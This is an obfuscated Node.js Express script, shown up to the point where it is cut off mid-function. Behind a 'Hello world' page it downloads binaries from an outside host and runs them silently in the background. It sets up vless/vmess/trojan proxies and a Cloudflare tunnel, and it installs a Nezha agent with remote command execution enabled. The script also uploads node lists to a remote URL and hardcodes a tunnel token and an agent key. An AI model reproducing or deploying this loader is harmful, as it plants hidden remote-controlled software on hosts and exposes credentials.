const _0x5f2aab=_0xb1f5;(function(_0x1b4e68,_0x16aaad){const _0x391d6f={_0x5568da:0xd9,_0x13632e:0x89,_0x47a0df:0xee,_0x24242a:0x102},_0x2306f6=_0xb1f5,_0x5f0dbd=_0x1b4e68();while(!![]){try{const _0x5e3d36=-parseInt(_0x2306f6(_0x391d6f._0x5568da))/0x1+-parseInt(_0x2306f6(0x105))/0x2+parseInt(_0x2306f6(0xb0))/0x3*(-parseInt(_0x2306f6(_0x391d6f._0x13632e))/0x4)+parseInt(_0x2306f6(0xbb))/0x5+parseInt(_0x2306f6(_0x391d6f._0x47a0df))/0x6+-parseInt(_0x2306f6(0x125))/0x7+parseInt(_0x2306f6(_0x391d6f._0x24242a))/0x8;if(_0x5e3d36===_0x16aaad)break;else _0x5f0dbd['push'](_0x5f0dbd['shift']());}catch(_0x2a17ab){_0x5f0dbd['push'](_0x5f0dbd['shift']());}}}(_0x12e4,0xcdb5b));const express=require(_0x5f2aab(0xc5)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x5f2aab(0x90)),{promisify}=require('util'),exec=promisify(require('child_process')[_0x5f2aab(0x7b)]),UPLOAD_URL=process[_0x5f2aab(0x8b)][_0x5f2aab(0x72)]||'',PROJECT_URL=process['env'][_0x5f2aab(0x88)]||'',AUTO_ACCESS=process[_0x5f2aab(0x8b)][_0x5f2aab(0x9d)]||![],FILE_PATH=process['env'][_0x5f2aab(0x114)]||_0x5f2aab(0xd8),SUB_PATH=process[_0x5f2aab(0x8b)][_0x5f2aab(0xd2)]||'sub',PORT=process[_0x5f2aab(0x8b)][_0x5f2aab(0xaf)]||process[_0x5f2aab(0x8b)][_0x5f2aab(0x97)]||0xbb8,UUID=process[_0x5f2aab(0x8b)][_0x5f2aab(0xaa)]||_0x5f2aab(0xa5),NEZHA_SERVER=process['env']['NEZHA_SERVER']||_0x5f2aab(0xd4),NEZHA_PORT=process[_0x5f2aab(0x8b)][_0x5f2aab(0x121)]||'',NEZHA_KEY=process[_0x5f2aab(0x8b)]['NEZHA_KEY']||_0x5f2aab(0xe4),ARGO_DOMAIN=process['env'][_0x5f2aab(0xa2)]||'miget.ake.cc.cd',ARGO_AUTH=process[_0x5f2aab(0x8b)][_0x5f2aab(0xfe)]||'eyJhIjoiMWYwY2E4ZDA3MGZmMTgxYjk5YjUyOTg2OTAzMjY5MTYiLCJ0IjoiMmJjOWViNjMtODVkMi00MzM0LWI0YWYtNDBkZThjM2ZmNTdmIiwicyI6Ik1HUTNZVFk1TjJZdE9UQTBaaTAwTVRFMExXSTVZVGN0TkRCaE5USTBNalZoT1RsaSJ9',ARGO_PORT=process[_0x5f2aab(0x8b)][_0x5f2aab(0xac)]||0x1f41,CFIP=process['env']['CFIP']||_0x5f2aab(0x80),CFPORT=process[_0x5f2aab(0x8b)][_0x5f2aab(0x123)]||0x1bb,NAME=process['env']['NAME']||_0x5f2aab(0x7a);!fs['existsSync'](FILE_PATH)?(fs[_0x5f2aab(0x108)](FILE_PATH),console[_0x5f2aab(0xb1)](FILE_PATH+_0x5f2aab(0xe1))):console[_0x5f2aab(0xb1)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x3bf1ef={_0x54fe61:0x73},_0x44c045=_0x5f2aab,_0x5bdf7c=_0x44c045(0xc0);let _0x3c5dd8='';for(let _0x1d3698=0x0;_0x1d3698<0x6;_0x1d3698++){_0x3c5dd8+=_0x5bdf7c[_0x44c045(_0x3bf1ef._0x54fe61)](Math[_0x44c045(0x10c)](Math[_0x44c045(0xf7)]()*_0x5bdf7c['length']));}return _0x3c5dd8;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0xb1f5(_0x37b07f,_0x5478ae){const _0x12e470=_0x12e4();return _0xb1f5=function(_0xb1f5a4,_0x58021f){_0xb1f5a4=_0xb1f5a4-0x6f;let _0x2c8f4f=_0x12e470[_0xb1f5a4];return _0x2c8f4f;},_0xb1f5(_0x37b07f,_0x5478ae);}let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x5f2aab(0xeb)](FILE_PATH,phpName),webPath=path[_0x5f2aab(0xeb)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x5f2aab(0xeb)](FILE_PATH,_0x5f2aab(0xab)),listPath=path[_0x5f2aab(0xeb)](FILE_PATH,'list.txt'),bootLogPath=path[_0x5f2aab(0xeb)](FILE_PATH,_0x5f2aab(0x12c)),configPath=path['join'](FILE_PATH,_0x5f2aab(0xe0));function deleteNodes(){const _0x26ea6f={_0x3c3298:0x71,_0x41eefe:0x99},_0x1ded96=_0x5f2aab;try{if(!UPLOAD_URL)return;if(!fs[_0x1ded96(_0x26ea6f._0x3c3298)](subPath))return;let _0x4a0776;try{_0x4a0776=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x3ad269=Buffer[_0x1ded96(0xfa)](_0x4a0776,'base64')['toString'](_0x1ded96(0xae)),_0x54f688=_0x3ad269['split']('\x0a')['filter'](_0x53638c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1ded96(0x126)](_0x53638c));if(_0x54f688[_0x1ded96(0x9f)]===0x0)return;return axios[_0x1ded96(_0x26ea6f._0x41eefe)](UPLOAD_URL+_0x1ded96(0xe8),JSON['stringify']({'nodes':_0x54f688}),{'headers':{'Content-Type':_0x1ded96(0xc6)}})['catch'](_0x2fffc9=>{return null;}),null;}catch(_0x9777bd){return null;}}function cleanupOldFiles(){const _0x26dc90={_0x243cd3:0x119},_0x276d29=_0x5f2aab;try{const _0x539272=fs[_0x276d29(0x127)](FILE_PATH);_0x539272[_0x276d29(_0x26dc90._0x243cd3)](_0x1e8b19=>{const _0x4d76=_0x276d29,_0x27f604=path[_0x4d76(0xeb)](FILE_PATH,_0x1e8b19);try{const _0x4fef82=fs[_0x4d76(0xd1)](_0x27f604);_0x4fef82['isFile']()&&fs[_0x4d76(0x12d)](_0x27f604);}catch(_0x39f940){}});}catch(_0x3ed8f4){}}async function generateConfig(){const _0x543228={_0x3f7bab:0xba,_0xe82940:0xd3,_0x337472:0xa3,_0x3660a2:0xb8,_0x49eede:0x106,_0x3d927e:0x106,_0x3ab051:0xb8,_0xd2f623:0x106,_0x4ea52a:0xb5,_0x22dec5:0xcb,_0x266c17:0x9b,_0x54ac00:0x118,_0x202a9a:0x104,_0x4288f7:0xeb},_0x9ab33d=_0x5f2aab,_0x33f66f={'log':{'access':'/dev/null','error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x9ab33d(_0x543228._0x3f7bab),'settings':{'clients':[{'id':UUID,'flow':_0x9ab33d(_0x543228._0xe82940)}],'decryption':_0x9ab33d(0x106),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x9ab33d(_0x543228._0x337472),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x9ab33d(_0x543228._0x3660a2),'protocol':_0x9ab33d(0xba),'settings':{'clients':[{'id':UUID}],'decryption':_0x9ab33d(_0x543228._0x49eede)},'streamSettings':{'network':'tcp','security':_0x9ab33d(_0x543228._0x3d927e)}},{'port':0xbba,'listen':_0x9ab33d(_0x543228._0x3ab051),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x9ab33d(_0x543228._0xd2f623),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x9ab33d(_0x543228._0x4ea52a),'tls',_0x9ab33d(_0x543228._0x22dec5)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x9ab33d(0xb8),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x9ab33d(_0x543228._0x337472)}},'sniffing':{'enabled':!![],'destOverride':[_0x9ab33d(_0x543228._0x4ea52a),_0x9ab33d(_0x543228._0x266c17),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x9ab33d(_0x543228._0x3ab051),'protocol':_0x9ab33d(_0x543228._0x54ac00),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x9ab33d(0x106),'wsSettings':{'path':_0x9ab33d(0x76)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x9ab33d(0x9b),_0x9ab33d(0xcb)],'metadataOnly':![]}}],'dns':{'servers':[_0x9ab33d(0xcf)]},'outbounds':[{'protocol':_0x9ab33d(0x75),'tag':_0x9ab33d(0x11b)},{'protocol':'blackhole','tag':_0x9ab33d(0xfb)}]};fs[_0x9ab33d(_0x543228._0x202a9a)](path[_0x9ab33d(_0x543228._0x4288f7)](FILE_PATH,'config.json'),JSON[_0x9ab33d(0x10e)](_0x33f66f,null,0x2));}function getSystemArchitecture(){const _0x1f3a8d={_0x5c64cd:0x112,_0x285b78:0xf0,_0x536aa0:0x9a,_0x596ea2:0xad},_0x37eac2=_0x5f2aab,_0x3b6fd2=os[_0x37eac2(_0x1f3a8d._0x5c64cd)]();return _0x3b6fd2===_0x37eac2(0x79)||_0x3b6fd2===_0x37eac2(_0x1f3a8d._0x285b78)||_0x3b6fd2===_0x37eac2(_0x1f3a8d._0x536aa0)?'arm':_0x37eac2(_0x1f3a8d._0x596ea2);}function downloadFile(_0x455cae,_0x168cf5,_0x27b74a){const _0x12748d={_0x4af1e1:0x108,_0x4d3623:0xdd},_0x2b1197={_0x36145b:0x10a},_0x349914={_0x5b6972:0x98},_0x4c6dcf={_0x6b2089:0xbc,_0x5ea7a3:0xb1,_0x2d8a8c:0xd5},_0x216b1c=_0x5f2aab,_0x29dafb=_0x455cae;!fs[_0x216b1c(0x71)](FILE_PATH)&&fs[_0x216b1c(_0x12748d._0x4af1e1)](FILE_PATH,{'recursive':!![]});const _0x2f077a=fs['createWriteStream'](_0x29dafb);axios({'method':_0x216b1c(_0x12748d._0x4d3623),'url':_0x168cf5,'responseType':'stream'})[_0x216b1c(0x11d)](_0x4a1ddf=>{const _0x2d011b={_0x20ba0d:0xc8,_0x25c3f6:0xd5,_0x1a0ee6:0x11e,_0x46fb98:0xe6},_0x27c60b=_0x216b1c;_0x4a1ddf[_0x27c60b(0xa9)][_0x27c60b(0xdb)](_0x2f077a),_0x2f077a['on']('finish',()=>{const _0x3c4e5c=_0x27c60b;_0x2f077a[_0x3c4e5c(_0x4c6dcf._0x6b2089)](),console[_0x3c4e5c(_0x4c6dcf._0x5ea7a3)](_0x3c4e5c(_0x4c6dcf._0x2d8a8c)+path[_0x3c4e5c(0x11e)](_0x29dafb)+_0x3c4e5c(0xf8)),_0x27b74a(null,_0x29dafb);}),_0x2f077a['on'](_0x27c60b(_0x349914._0x5b6972),_0x900592=>{const _0x443b71=_0x27c60b;fs[_0x443b71(_0x2d011b._0x20ba0d)](_0x29dafb,()=>{});const _0x246129=_0x443b71(_0x2d011b._0x25c3f6)+path[_0x443b71(_0x2d011b._0x1a0ee6)](_0x29dafb)+_0x443b71(0x10a)+_0x900592[_0x443b71(_0x2d011b._0x46fb98)];console['error'](_0x246129),_0x27b74a(_0x246129);});})['catch'](_0x1105bb=>{const _0x210625=_0x216b1c,_0x5a7055=_0x210625(0xd5)+path[_0x210625(0x11e)](_0x29dafb)+_0x210625(_0x2b1197._0x36145b)+_0x1105bb[_0x210625(0xe6)];console['error'](_0x5a7055),_0x27b74a(_0x5a7055);});}async function downloadFilesAndRun(){const _0x4b898f={_0xb68d6c:0x9f,_0x78ad58:0xb1,_0x22690f:0x107,_0x58cc85:0x98,_0x1d2e0d:0x120,_0x1fb93c:0x104,_0x4085b5:0x10b,_0x52dd05:0xd6,_0x270508:0xe2,_0x1204cc:0xf6,_0x3823e1:0x11c,_0x460184:0x98,_0x41673d:0xa0,_0x591901:0xb1,_0x2a2e6b:0x113,_0x292f19:0x71,_0x106a89:0x85,_0x451fa4:0xc9,_0x4e7914:0x98,_0x3c956e:0x94},_0x1df390={_0xc872a3:0x119},_0x11d31e=_0x5f2aab,_0x729fe=getSystemArchitecture(),_0x170865=getFilesForArchitecture(_0x729fe);if(_0x170865[_0x11d31e(_0x4b898f._0xb68d6c)]===0x0){console[_0x11d31e(_0x4b898f._0x78ad58)](_0x11d31e(_0x4b898f._0x22690f));return;}const _0x156428=_0x170865[_0x11d31e(0x93)](_0x5be595=>{return new Promise((_0x204be2,_0x260b89)=>{const _0xcabf1=_0xb1f5;downloadFile(_0x5be595['fileName'],_0x5be595[_0xcabf1(0x12e)],(_0x66f064,_0xe9cd8)=>{_0x66f064?_0x260b89(_0x66f064):_0x204be2(_0xe9cd8);});});});try{await Promise[_0x11d31e(0xd0)](_0x156428);}catch(_0x488917){console[_0x11d31e(_0x4b898f._0x58cc85)](_0x11d31e(0xf1),_0x488917);return;}function _0x348042(_0x509f94){const _0x1a57b8={_0x3184c5:0xca,_0x1de738:0xb1,_0x1aa719:0x87},_0x4715f9=_0x11d31e,_0x59997f=0x1fd;_0x509f94[_0x4715f9(_0x1df390._0xc872a3)](_0x40006f=>{const _0x287fca=_0x4715f9;fs['existsSync'](_0x40006f)&&fs[_0x287fca(0x8e)](_0x40006f,_0x59997f,_0x32df0f=>{const _0x3a6487=_0x287fca;_0x32df0f?console[_0x3a6487(0x98)](_0x3a6487(_0x1a57b8._0x3184c5)+_0x40006f+':\x20'+_0x32df0f):console[_0x3a6487(_0x1a57b8._0x1de738)](_0x3a6487(_0x1a57b8._0x1aa719)+_0x40006f+':\x20'+_0x59997f[_0x3a6487(0x7f)](0x8));});});}const _0x1ba060=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x348042(_0x1ba060);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5cc625=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x11d31e(_0x4b898f._0x1d2e0d)]():'',_0x284284=new Set(['443',_0x11d31e(0x78),_0x11d31e(0x82),'2087','2083',_0x11d31e(0x109)]),_0x30fc44=_0x284284['has'](_0x5cc625)?_0x11d31e(0xf9):_0x11d31e(0xc4),_0x5b58bb=_0x11d31e(0x12a)+NEZHA_KEY+_0x11d31e(0x8c)+NEZHA_SERVER+_0x11d31e(0x124)+_0x30fc44+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x11d31e(_0x4b898f._0x1fb93c)](path['join'](FILE_PATH,_0x11d31e(_0x4b898f._0x4085b5)),_0x5b58bb);const _0x23da02=_0x11d31e(0x113)+phpPath+_0x11d31e(0x8d)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x23da02),console[_0x11d31e(0xb1)](phpName+_0x11d31e(_0x4b898f._0x52dd05)),await new Promise(_0x437fd6=>setTimeout(_0x437fd6,0x3e8));}catch(_0x53a626){console[_0x11d31e(0x98)]('php\x20running\x20error:\x20'+_0x53a626);}}else{let _0x4b98ab='';const _0x5d0549=[_0x11d31e(0x9e),_0x11d31e(0x78),_0x11d31e(0x82),'2087',_0x11d31e(0x110),_0x11d31e(0x109)];_0x5d0549[_0x11d31e(_0x4b898f._0x270508)](NEZHA_PORT)&&(_0x4b98ab=_0x11d31e(_0x4b898f._0x1204cc));const _0x56ff1f=_0x11d31e(0x113)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x11d31e(0xce)+NEZHA_KEY+'\x20'+_0x4b98ab+_0x11d31e(_0x4b898f._0x3823e1);try{await exec(_0x56ff1f),console[_0x11d31e(0xb1)](npmName+_0x11d31e(_0x4b898f._0x52dd05)),await new Promise(_0x58aab2=>setTimeout(_0x58aab2,0x3e8));}catch(_0x1ec68d){console[_0x11d31e(_0x4b898f._0x460184)](_0x11d31e(_0x4b898f._0x41673d)+_0x1ec68d);}}}else console[_0x11d31e(_0x4b898f._0x591901)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x2bb06d=_0x11d31e(_0x4b898f._0x2a2e6b)+webPath+_0x11d31e(0xf4)+FILE_PATH+_0x11d31e(0x7e);try{await exec(_0x2bb06d),console['log'](webName+_0x11d31e(0xd6)),await new Promise(_0x5a4f38=>setTimeout(_0x5a4f38,0x3e8));}catch(_0x322463){console[_0x11d31e(0x98)](_0x11d31e(0xf5)+_0x322463);}if(fs[_0x11d31e(_0x4b898f._0x292f19)](botPath)){let _0x472dd7;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x472dd7='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x11d31e(0x96)](/TunnelSecret/)?_0x472dd7=_0x11d31e(_0x4b898f._0x106a89)+FILE_PATH+'/tunnel.yml\x20run':_0x472dd7='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x11d31e(_0x4b898f._0x451fa4)+ARGO_PORT;try{await exec(_0x11d31e(_0x4b898f._0x2a2e6b)+botPath+'\x20'+_0x472dd7+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x11d31e(_0x4b898f._0x52dd05)),await new Promise(_0x18dc14=>setTimeout(_0x18dc14,0x7d0));}catch(_0x19183f){console[_0x11d31e(_0x4b898f._0x4e7914)](_0x11d31e(_0x4b898f._0x3c956e)+_0x19183f);}}await new Promise(_0x33bf11=>setTimeout(_0x33bf11,0x1388));}function _0x12e4(){const _0x251baf=['data','UUID','sub.txt','ARGO_PORT','amd','utf-8','SERVER_PORT','9174VpPSJn','log','\x0a\x0avmess://','text/plain;\x20charset=utf-8','ARGO_DOMAIN:','http','/api/add-subscriptions','https://amd64.ssss.nyc.mn/v1','127.0.0.1','\x20>/dev/null\x202>&1','vless','1712930ZJjaYm','close','readFile','Unhandled\x20error\x20in\x20startserver:','send','abcdefghijklmnopqrstuvwxyz','org','Add\x20automatic\x20access\x20task\x20faild:\x20','index.html','false','express','application/json','/vmess-argo?ed=2560','unlink','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Empowerment\x20failed\x20for\x20','quic','tunnel.yml','\x0avless://','\x20-p\x20','https+local://8.8.8.8/dns-query','all','statSync','SUB_PATH','xtls-rprx-vision','nz.thall.ggff.net:8008','Download\x20','\x20is\x20running','readFileSync','.tmp','1219377gICrnJ','pkill\x20-f\x20\x22[','pipe','&path=%2Ftrojan-argo%3Fed%3D2560#','get','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Skipping\x20adding\x20automatic\x20access\x20task','config.json','\x20is\x20created','includes','tunnel.json','iq1r9uCBejmoq7uA2heq0VsN7aoiVWB3','set','message','catch','/api/delete-nodes','firefox','unshift','join','https://api.ip.sb/geoip','utf8','477606thSRmn','promises','arm64','Error\x20downloading\x20files:','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','status','\x20-c\x20','web\x20running\x20error:\x20','--tls','random','\x20successfully','true','from','block','https://amd64.ssss.nyc.mn/agent','ArgoDomain:','ARGO_AUTH','countryCode','https://oooo.serv00.net/add-url','?security=tls&sni=','34760296inRHEh','win32','writeFileSync','2974874ZOxlAR','none','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','mkdirSync','2053','\x20failed:\x20','config.yaml','floor','listen','stringify','Content-Type','2083','country_code','arch','nohup\x20','FILE_PATH','filter','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://arm64.ssss.nyc.mn/bot','trojan','forEach','taskkill\x20/f\x20/im\x20','direct','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','then','basename','rm\x20-rf\x20','pop','NEZHA_PORT','Subscription\x20uploaded\x20successfully','CFPORT','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','2937795vdhEYI','test','readdirSync','http://ip-api.com/json','clear','\x0aclient_secret:\x20','split','boot.log','unlinkSync','fileUrl','\x0a\x20\x20tunnel:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x0a\x20\x20credentials-file:\x20','response','existsSync','UPLOAD_URL','charAt','substring','freedom','/trojan-argo','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','8443','arm','PL-Miget','exec','replace','Error\x20in\x20startserver:','/config.json\x20>/dev/null\x202>&1\x20&','toString','saas.sin.fan','Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!','2096','\x22\x20>\x20/dev/null\x202>&1','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','push','Empowerment\x20success\x20for\x20','PROJECT_URL','1044sDCukh','base64','env','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20-c\x20\x22','chmod','/sub.txt\x20saved\x20successfully','path','https://arm64.ssss.nyc.mn/v1','isp','map','Error\x20executing\x20command:\x20','Mozilla/5.0','match','PORT','error','post','aarch64','tls','success','AUTO_ACCESS','443','length','npm\x20running\x20error:\x20','App\x20is\x20running','ARGO_DOMAIN','/vmess-argo','&fp=firefox&type=ws&host=','f935f899-b9b4-4c8b-8341-894d1678f367','.exe\x20>\x20nul\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','TunnelSecret'];_0x12e4=function(){return _0x251baf;};return _0x12e4();}function getFilesForArchitecture(_0x346cf6){const _0x5477db={_0x3b790d:0x117,_0x58510b:0x79,_0x9fa0d2:0xfc,_0xd6421d:0xea,_0x30914d:0xea},_0x304833=_0x5f2aab;let _0xdd1e36;_0x346cf6===_0x304833(0x79)?_0xdd1e36=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x304833(_0x5477db._0x3b790d)}]:_0xdd1e36=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2cfd73=_0x346cf6===_0x304833(_0x5477db._0x58510b)?'https://arm64.ssss.nyc.mn/agent':_0x304833(_0x5477db._0x9fa0d2);_0xdd1e36[_0x304833(_0x5477db._0xd6421d)]({'fileName':npmPath,'fileUrl':_0x2cfd73});}else{const _0x50db0a=_0x346cf6===_0x304833(0x79)?_0x304833(0x91):_0x304833(0xb7);_0xdd1e36[_0x304833(_0x5477db._0x30914d)]({'fileName':phpPath,'fileUrl':_0x50db0a});}}return _0xdd1e36;}function argoType(){const _0x24f484={_0x374fa1:0xb1,_0x2858fb:0xf2,_0x26a3c9:0xa8,_0x36c09e:0x6f,_0x368c5e:0x77,_0x1796c2:0x104,_0xa6ac30:0xeb,_0x3295e6:0x130},_0x573367=_0x5f2aab;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x573367(_0x24f484._0x374fa1)](_0x573367(_0x24f484._0x2858fb));return;}if(ARGO_AUTH['includes'](_0x573367(_0x24f484._0x26a3c9))){fs[_0x573367(0x104)](path[_0x573367(0xeb)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x35e093=_0x573367(0x12f)+ARGO_AUTH[_0x573367(0x12b)]('\x22')[0xb]+_0x573367(_0x24f484._0x36c09e)+path[_0x573367(0xeb)](FILE_PATH,_0x573367(0xe3))+_0x573367(0x84)+ARGO_DOMAIN+_0x573367(_0x24f484._0x368c5e)+ARGO_PORT+_0x573367(0xde);fs[_0x573367(_0x24f484._0x1796c2)](path[_0x573367(_0x24f484._0xa6ac30)](FILE_PATH,_0x573367(0xcc)),_0x35e093);}else console[_0x573367(0xb1)](_0x573367(_0x24f484._0x3295e6));}async function extractDomains(){const _0xb4b050={_0x218ece:0xb4,_0x194e54:0xeb,_0x194ad7:0x12b,_0x5a44d3:0xfd,_0x75ccda:0xb1,_0x4c70ba:0x12c,_0x100754:0xa7},_0x205646={_0x5b5c4a:0x95,_0x597ddf:0xa9,_0x4f9808:0x92,_0x572945:0x111,_0x2fd8f4:0x92,_0x5a7f87:0x128,_0x5a5856:0xa9,_0x1372d3:0x9c,_0x151fd5:0xa9,_0x41c678:0xff,_0x16a1bf:0xc1},_0x3bdd95={_0x349df2:0x11a,_0x3f581d:0xda,_0x4b15c8:0x73,_0x3d969b:0x83},_0x2950e9=_0x5f2aab;let _0x442c58;if(ARGO_AUTH&&ARGO_DOMAIN)_0x442c58=ARGO_DOMAIN,console[_0x2950e9(0xb1)](_0x2950e9(_0xb4b050._0x218ece),_0x442c58),await _0x480731(_0x442c58);else try{const _0x4ee842=fs['readFileSync'](path[_0x2950e9(_0xb4b050._0x194e54)](FILE_PATH,_0x2950e9(0x12c)),_0x2950e9(0xae)),_0xbeda21=_0x4ee842[_0x2950e9(_0xb4b050._0x194ad7)]('\x0a'),_0x2cd889=[];_0xbeda21['forEach'](_0x1bdcbb=>{const _0x4de31e=_0x2950e9,_0x1cee51=_0x1bdcbb['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1cee51){const _0xee91bf=_0x1cee51[0x1];_0x2cd889[_0x4de31e(0x86)](_0xee91bf);}});if(_0x2cd889[_0x2950e9(0x9f)]>0x0)_0x442c58=_0x2cd889[0x0],console['log'](_0x2950e9(_0xb4b050._0x5a44d3),_0x442c58),await _0x480731(_0x442c58);else{console[_0x2950e9(_0xb4b050._0x75ccda)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x2950e9(0x12d)](path[_0x2950e9(_0xb4b050._0x194e54)](FILE_PATH,_0x2950e9(_0xb4b050._0x4c70ba)));async function _0x1d338a(){const _0x4c02af=_0x2950e9;try{process['platform']==='win32'?await exec(_0x4c02af(_0x3bdd95._0x349df2)+botName+_0x4c02af(0xa6)):await exec(_0x4c02af(_0x3bdd95._0x3f581d)+botName[_0x4c02af(_0x3bdd95._0x4b15c8)](0x0)+']'+botName[_0x4c02af(0x74)](0x1)+_0x4c02af(_0x3bdd95._0x3d969b));}catch(_0x398889){}}_0x1d338a(),await new Promise(_0x3ae6b7=>setTimeout(_0x3ae6b7,0xbb8));const _0x5b9811=_0x2950e9(_0xb4b050._0x100754)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x2950e9(0x113)+botPath+'\x20'+_0x5b9811+'\x20>/dev/null\x202>&1\x20&'),console[_0x2950e9(_0xb4b050._0x75ccda)](botName+'\x20is\x20running'),await new Promise(_0x2befbb=>setTimeout(_0x2befbb,0xbb8)),await extractDomains();}catch(_0x3c4355){console[_0x2950e9(0x98)](_0x2950e9(0x94)+_0x3c4355);}}}catch(_0x3d768a){console['error']('Error\x20reading\x20boot.log:',_0x3d768a);}async function _0x3debf4(){const _0x226367=_0x2950e9;try{const _0xf55835=await axios['get'](_0x226367(0xec),{'headers':{'User-Agent':_0x226367(_0x205646._0x5b5c4a),'timeout':0xbb8}});if(_0xf55835[_0x226367(_0x205646._0x597ddf)]&&_0xf55835[_0x226367(0xa9)][_0x226367(0x111)]&&_0xf55835[_0x226367(0xa9)][_0x226367(_0x205646._0x4f9808)])return(_0xf55835[_0x226367(_0x205646._0x597ddf)][_0x226367(_0x205646._0x572945)]+'-'+_0xf55835[_0x226367(0xa9)][_0x226367(_0x205646._0x2fd8f4)])[_0x226367(0x7c)](/\s+/g,'_');}catch(_0x5ab681){try{const _0x563920=await axios['get'](_0x226367(_0x205646._0x5a7f87),{'headers':{'User-Agent':_0x226367(0x95),'timeout':0xbb8}});if(_0x563920[_0x226367(_0x205646._0x5a5856)]&&_0x563920[_0x226367(_0x205646._0x5a5856)][_0x226367(0xf3)]===_0x226367(_0x205646._0x1372d3)&&_0x563920['data'][_0x226367(0xff)]&&_0x563920['data'][_0x226367(0xc1)])return(_0x563920[_0x226367(_0x205646._0x151fd5)][_0x226367(_0x205646._0x41c678)]+'-'+_0x563920[_0x226367(0xa9)][_0x226367(_0x205646._0x16a1bf)])[_0x226367(0x7c)](/\s+/g,'_');}catch(_0x25079f){}}return'Unknown';}async function _0x480731(_0x3a715b){const _0x5cfaef={_0x17e767:0xe9,_0x1275fa:0xcd,_0x377f25:0x10e,_0x494161:0x8a,_0x533657:0xdc,_0x51dcf1:0xfa,_0x451f91:0x7f,_0x49e8a4:0x8a,_0x144313:0xfa,_0x109843:0xb1,_0x39a70a:0xdd},_0x2e318c=await _0x3debf4(),_0x430142=NAME?NAME+'-'+_0x2e318c:_0x2e318c;return new Promise(_0x132d71=>{const _0x32f587={_0x362a0e:0x7f,_0x45c000:0x8a,_0x4dcb75:0xe5,_0x571155:0x10f};setTimeout(()=>{const 